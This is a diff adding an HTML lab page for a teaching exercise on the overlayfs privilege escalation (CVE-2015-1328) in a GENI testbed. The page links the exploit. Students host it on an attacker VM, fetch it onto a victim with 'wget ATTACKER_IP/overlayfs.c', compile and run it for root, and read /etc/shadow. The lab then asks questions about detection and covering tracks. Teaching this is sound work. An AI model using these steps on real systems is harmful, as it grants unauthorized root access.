@@ -1,0 +1,157 @@
+<html>
+	<head>
+		<title>Privilege Escalation Lab</title>
+		<link rel="stylesheet" type="text/css" href="css/skeleton.css" media="screen">
+		<link rel="stylesheet" type="text/css" href="css/skeleton.css" media="print">
+		<script src="js/jquery.js"></script>
+		<script src="js/main.js"></script>
+	</head>
+	<body>
+<!-- Do we have an rspec for this? !-->
+
+
+		<div class="container">
+			<div id="header">
+				<div id="header_info">
+					<center><h1 id="logo_cyber">Cyberpaths</h1></center>
+				</div>
+			</div>
+			<div id="site_body">
+				<div id="actual_content">
+					<div id="main_title"><center><h5>- Privilege Escalation Lab -</h5></center></div><br><br>
+					<div class="title_bg"><h3>Lab Goals</h3></div><hr>
+					<div class="subcontent">
+						<ul class="instructions">
+							<li>Obtain an Experimental Perspective of a Privilege Escalation Attack</li>
+							<li>Become Acquainted wtih User Privileges</li>
+							<li>Apply Log Collection and Computer Network Forensics to Detect a Privilege Escalation Attack</li>
+						</ul>
+					</div>
+
+					<br><div class="title_bg"><h3>A Brief Introduction to Privilege Escalation</h3></div><hr>
+					<div class="subcontent">
+						<ol class="instructions">
+						This lab is intended to provide a brief introduction into the area of attacks known as "Privilege Escalation (PE)" or "User to Root (U2R)" attacks.
+						A Privilege Escalation attack involves a user gaining access to actions or privileges that would be otherwise unavailable to a regular user.
+						These privileges such as editing the system's password file, installing programs, and editing already installed app configurations, are available to a superuser or root.
+
+						Some PE attacks exploit a pre-existing privilege granted to the user in order to permanently elevate their access.
+						For example, the DirtyCOW (CVE-2016-5195) attack exploits a system's copy-on-write mechanism in order to write to a file that is normally accessed as read-only.
+						This lab walks through an implementation of the overlayfs vulnerability (CVE-2015-1328) which exploits the fact that the overlayfs filesystem does not check file permissions when creating files in its upper directories.
+						This allows a user to create a binary with root-privileges, essentially giving them full access to a system.
+						In the steps below, an attacker will gain access to an unprivileged user on a victim machine, download malicious code, compile it, and run the attack, giving the attacker root access to the system.
+						</ol>
+					</div>
+
+					<br><div class='title_bg'><h3>Prerequisites</h3></div><hr>
+                                        <div class='subcontent'>
+                                            <ul class='instructions'>
+						    <li>You will need basic command line knowledge to complete this lab. Codecademy has a great <a href='https://www.codecademy.com/learn/learn-the-command-line' target=_blank>tutorial</a> on this topic. </li>
+						    <li>In this lab, you will use a vulnerability from <a href='https://cve.mitre.org/'  target=_blank>CVE database</a> that is available to any adversary. </li>
+						    <li>You can learn more about overlayfs filesystem in this <a href='https://www.datalight.com/blog/2016/01/27/explaining-overlayfs-%E2%80%93-what-it-does-and-how-it-works/' target=_blank> website</a>.</li>
+							</ul>
+                                        </div>
+
+					<br><div class="title_bg"><h3>Topology and Necessary Files</h3></div><hr>
+					<div class="subcontent">
+						<ol class="instructions">
+							<li>Layout of the GENI topology for this lab:</li>
+							<center><img class="u-max-full-width" src="img/screenshots/Figure1.png" style="height:40%";></center><br>
+							<figcaption>The Privilege Escalation Lab GENI Topology</figcaption>
+							<li>Information regarding the three nodes is given below:</li>
+								<ul>
+									<li>Attacker - Machine Type: XEN VM, Hardware: Ubuntu 16.04 LTS 64-Bit</li>
+									<li>Victim - Machine Type: XEN VM, Hardware: Ubuntu 14.04 LTS 64-Bit</li>
+									<li>Switch - Machine Type: OF OVS</li>
+								</ul>
+							<li><i>Note that the victim uses an older OS version. Why do you think this is the case?</i></li>
+							<li>The only file needed for this lab is the <a href='https://www.exploit-db.com/exploits/39166/' target=_blank> overlayfs.c</a> file.</li>
+						</ol>
+					</div>
+
+					<br><div class="title_bg"><h3>Part 1: Setting Up the Attacker</h3></div><hr>
+					<div class="subcontent">
+						<ol class="instructions">
+							<li>The first thing you want to do is install all the necessary software on the Attacker machine. SSH into the Attacker machine and type <code>sudo apt-get update --fix-missing</code>. This will automatically install the dependencies necessary for apache2.</li>
+							<li>Type <code>sudo apt-get install apache2 -y</code> in order to install apache2 on the machine.</li>
+							<li>Apache2 should automatically start itself after being installed, but, to make sure, enter the command <code>sudo service apache2 start</code>. You can verify it is running by entering the command <code>sudo service apache2 status</code>.</li>
+							<center><img class="u-max-full-width" src="img/screenshots/Figure2.png" style="height:40%;"></center><br>
+
+							<li>In order to emulate remote access to the victim machine from the attacker machine, you will need to be able to SSH from the attacker to the victim. Using <a href='http://mountrouidoux.people.cofc.edu/CyberPaths/winscp.html'  target=_blank> WinSCP</a> or <a href='http://mountrouidoux.people.cofc.edu/CyberPaths/sftpmac.html'  target=_blank>scp</a>, transfer over your GENI private key file from your local host, i.e., your pc/laptop, to the attacker machine. With scp: <pre><code>scp -i KEY_FILE -P PORT KEY_FILE USER@HOST:~</code></pre></li>
+							<li>When using SSH with a key file, the key file has to have specific permissions. In order to verify that the transferred file has the right permissions, enter the command <pre><code>sudo chmod 0600 KEY_FILE</code></pre></li>
+							<center><img class="u-max-full-width" src="img/screenshots/Figure3.png" style="height:20%;"></center><br>
+							<li>In addition, transfer over the provided overlayfs.c file to the Attacker machine, using the same format for the scp command as used above. With scp: <pre><code>scp -i KEY_FILE -P ATTACKER_PORT overlayfs.c USER@HOST:~</code></pre></li>
+							<li>After both files have been transferred, move the exploit file so that it can be remotely downloaded from the apache2 server: <pre><code>sudo mv overlayfs.c /var/www/html/</code></pre></li>
+							<li>Finally, type <code>sudo ifconfig</code>, and record the IP address displayed under eth0. You will need this for later.</li>
+							<center><img class="u-max-full-width" src="img/screenshots/Figure4.png" style="height:20%;"></center>
+
+						</ol>
+					</div>
+
+					<br><div class="title_bg"><h3>Part 2: Setting Up the Victim</h3></div><hr>
+					<div class="subcontent">
+						<ol class="instructions">
+							<li><i>Here we describe how an administrator (admin) would add a regular user to a system. First, the admin would create the user and give a test password that the user should change after their first login. Then, the admin would create a folder for the user to be able to add their files and operate in their own sandbox. An outsider could intercept/fish the password of the regular user and use this to access their account. However, they still do not have much power over the system. They cannot edit the password file or install a malicious app, until they elevate their privileges.</i></li>
+							<li>All of the users in a slice on GENI automatically have sudoer privileges on any GENI topology machines. So, in order to emulate local access with a low permission user, you need to create one. SSH into the Victim machine and enter the command <code>sudo useradd name</code>, where name can be substituted by any user name, such as "alice".</li>
+							<li>In order to set a password for "alice", use the command <code>sudo passwd alice</code>, and enter the new password when prompted.</li>
+							<li>However, "alice" does not have a home directory and is currently unable to read or write files on the machine. So, you need to create a home directory for the newly created user: <code>sudo mkdir /home/alice</code>.</li>
+							<li>Since this directory was created under another user's ownership, "alice" will not be able to operate in the folder like normal. By using the following command, you give "alice" privileges in its home directory: <code>sudo chown name /home/alice</code>.</li>
+							<center><img class="u-max-full-width" src="img/screenshots/Figure5.png" style="height:30%;"></center><br>
+							<li>alice will be playing the role of the victim user that has hypothetically shared their password with the hacker (or reused the same password that was hacked from a vulnerable database etc.).</li>
+						</ol>
+					</div>
+
+					<br><div class="title_bg"><h3>Part 3: Running the Attack</h3></div><hr>
+					<div class="subcontent">
+						<ol class="instructions">
+							<li>Once everything has been set up, you can start running the attack. SSH into your Attacker machine, and, from the Attacker machine, SSH into the Victim machine as a regular user. In our example, you need to login as "alice", assuming that you have gotten her password either with a phishing action or by intercepting it. This simulates local user access.</li>
+							<li>You should be automatically directed to the recently created home directory for "name". In order to verify who you are, enter the command <code>whoami</code>. In order to verify that you do not have sudoer permissions, enter the command <code>sudo cat /etc/shadow</code>. You should receive a response like that in Figure 6.</li>
+							<center><img class="u-max-full-width" src="img/screenshots/Figure6.png" style="height:18%;"></center><br>
+							<li>Now that you have verified you are a local user with no special privileges, you can start working your way up. First, you need to download the exploit file from the Attacker machine: <code>wget ATTACKER_IP/overlayfs.c</code>, where the <code>ATTACKER_IP</code> needs to be substituted by the eth0 IP that you collected in Part 1, Step 8. This emulates the attacker transferring files to the victim machine through their own server.</li>
+							<li>Entering the command <code>ls</code> should verify that your download was successful.</li>
+							<li>In order to be able to run the attack, you need to compile the C code: <code>gcc overlayfs.c -o overlayfs</code>.</li>
+							<center><img class="u-max-full-width" src="img/screenshots/Figure7.png" style="height:30%;"></center><br>
+							<li>To run the attack, enter <code>./overlayfs</code>, and wait until you see a "#" prompt in the terminal window, signifying that you have root access.</li>
+							<li>In order to verify that you are now the root user, enter the commands <pre><code>whoami <br>sudo cat /etc/shadow</code></pre> Typing "whoami" should reveal that you are now root, and being able to display the contents of the "/etc/shadow" file displays the privileges you now have.</li>
+							<center><img class="u-max-full-width" src="img/screenshots/Figure8.png" style="height:30%;"></center><br>
+
+						</ol>
+					</div>
+
+					<br><div class="title_bg"><h3>Part 4: Understanding What Overlayfs is Doing</h3></div><hr>
+					<div class="subcontent">
+						<ol class="instructions">
+							<li>Read about the overlayfs vulnerability (CVE-2015-1328), and browse the overlayfs.c code. What do you think it is doing, and how would you implement CVE-2015-1328?</li>
+							<li>If you were the attacker, how would you confirm that this exploit works in this specific system?</li>
+							<li>How do you think an attacker discovers vulnerabilities such as overlayfs? Describe the steps and thinking process?</li>
+						</ol>
+					</div>
+
+					<br><div class="title_bg"><h3>Part 5: Discovery and Covering Tracks</h3></div><hr>
+					<div class="subcontent">
+						<ol class="instructions">
+							<li>How would you discover that an attack like this one has taken place in your machine if you were the system administrator?</li>
+							<li>What if you were a hacker that wanted to cover their tracks? What would you do to cover up this type of attack?</li>
+						</ol>
+					</div>
+
+					<br><div class="title_bg"><h3>Part 6: Running Your Own Privilege Escalation Attack</h3></div><hr>
+					<div class="subcontent">
+
+							There are many local privilege escalation attacks similar to the one displayed above, and many of them can be carried out in a format similar to this lab: gain access, download exploit, run exploit. Listed below are a few such similar exploits that are used to escalate a local user's privileges to those of root:<br>
+								<br><ul>
+									<li>DirtyCOW</li>
+									<li>Mr. Robot</li>
+									<li>Distcc_Exec Reverse Shell</li>
+									<li>IP6T_SO_SET_REPLACE</li>
+								</ul>
+
+					</div>
+
+
+
+				</div>
+			</div>
+	</div>
+	</body>
+</html>
